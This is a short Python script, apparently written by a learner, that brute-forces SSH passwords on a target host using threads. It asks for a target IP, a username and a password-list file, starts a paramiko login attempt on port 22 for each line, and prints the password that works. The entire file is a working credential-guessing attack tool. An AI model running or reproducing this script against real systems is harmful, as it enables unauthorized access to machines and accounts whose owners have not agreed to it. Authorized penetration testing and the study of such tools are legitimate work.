#to try to make the script faster, lets try threading

import paramiko
import sys
import os
import threading

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

# Define a lock to synchronize access to stdout
#remember, stdout = standard output
print_lock = threading.Lock()

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        with print_lock:
            print('password found: ' + password)
            os._exit(0)  # Terminate all threads when password is found
    except paramiko.AuthenticationException:
        pass
    finally:
        ssh.close()

def main():
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()

            # Create a thread for each password attempt
            t = threading.Thread(target=ssh_connect, args=(password,))
            t.start()

if __name__ == '__main__':
    main()
